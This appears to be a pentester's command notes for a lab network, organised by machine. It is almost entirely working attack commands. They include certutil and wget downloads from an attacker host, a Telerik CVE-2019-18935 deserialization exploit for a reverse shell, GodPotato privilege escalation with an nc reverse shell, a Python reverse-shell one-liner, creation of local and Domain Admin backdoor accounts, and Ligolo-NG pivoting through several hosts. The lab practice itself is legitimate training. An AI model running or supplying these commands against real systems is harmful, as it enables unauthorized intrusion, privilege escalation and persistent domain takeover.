# INITIAL MACHINE

```
//Uploading files
certutil.exe -urlcache -f http://10.10.14.3:8080/agent.exe agent.exe 
certutil.exe -urlcache -f http://10.10.14.3:8080/nc64.exe nc.exe 
certutil.exe -urlcache -f http://10.10.14.3:8080/GodPotato.exe GodPotato.exe 
certutil.exe -urlcache -f http://10.10.14.3:8080/antak.aspx antak.aspx
copy antak.aspx C:\DotNetNuke


//Getting a revshell via deserialization
python3 CVE-2019-18935.py -u http://10.10.110.10/Telerik.Web.UI.WebResource.axd?type=rau -v 2013.2.717 -f 'C:\Windows\Temp' -p /home/millycash/Downloads/Cybernetics/CVE-2019-18935-master/payloads/reverse-shell-074029,50-amd64.dll


//GotPotato.exe
GodPotato -cmd "C:\temp\nc.exe -t -e C:\Windows\System32\cmd.exe 10.10.14.3 443"


//Local admin
net user yovecio yovecio /add && net localgroup administrators yovecio /add


//Ligolo-NG(requisites)
sudo ip tuntap add user millycash mode tun ligolo;
sudo ip tuntap add user millycash mode tun ligolo2;
sudo ip link set ligolo up;
sudo ip link set ligolo2 up;
sudo ip route add 10.9.20.0/24 dev ligolo;
sudo ip route add 240.0.0.1/32 dev ligolo;
sudo ip route add 10.9.15.0/24 dev ligolo;
sudo ip route add 10.9.10.0/24 dev ligolo2;
./proxy -selfcert -laddr 0.0.0.0:443



//Ligolo connect
START /MIN agent.exe -connect 10.10.14.3:443 -ignore-cert


//Inside Ligolo server
listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443
listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:8080
```

&nbsp;

# M3DC

```
//Adding a local user 
net user yovecio yovecio /add /domain && net group "Domain Admins" yovecio /add /domain
```

&nbsp;

# Linux Wordpress

```
//Run the exploit
python3 exploit.py -u http://10.9.15.11


//Getting a better shell
./nc.exe -lvnp 2222
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.9.20.13",2222));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'


//Upload & connect to Ligolo
wget http://10.9.20.13:8080/agent; chmod +x agent
./agent -connect 10.9.20.13:443 -ignore-cert &

//Fixing Ligolo
sudo ip route delete 10.9.15.0/24;
sudo ip route add 10.9.15.0/24 dev ligolo2;
start --tun ligolo2
```

&nbsp;

# COREDC

```
//Add local user
net user yovecio yovecio /add /domain && net group "Domain Admins" yovecio /add /domain
```

&nbsp;

# CYDC

```
//Add local user
net user yovecio yovecio /add /domain && net group "Domain Admins" yovecio /add /domain

//Fixing Ligolo
sudo ip tuntap add user millycash mode tun ligolo3;
sudo ip link set ligolo3 up;
sudo ip route add 10.9.30.0/24 dev ligolo3;
sudo ip route add 10.9.40.0/24 dev ligolo3;

//Upload & connect to Ligolo
cd C:\Temp
wget http://10.9.20.13:8080/agent.exe -outfile agent.exe
Start-Job -name Ligolo { C:\temp\agent.exe -connect 10.9.20.13:443 -ignore-cert }

//Adjusting routes in Ligolo
sudo ip route delete 10.9.10.0/24;
sudo ip route add 10.9.10.0/24 dev ligolo3;
start --tun ligolo3
```

&nbsp;

# INWTK001

```
//Fixing Ligolo
sudo ip tuntap add user millycash mode tun ligolo4;
sudo ip link set ligolo4 up;

//Upload & connect to Ligolo
cd C:\Temp
certutil.exe -urlcache -f http://10.9.20.13:8080/agent.exe agent.exe
START /MIN agent.exe -connect 10.9.20.13:443 -ignore-cert

//Adjusting routes in Ligolo
sudo ip route delete 10.9.40.0/24;
sudo ip route add 10.9.40.0/24 dev ligolo4;
start --tun ligolo4
```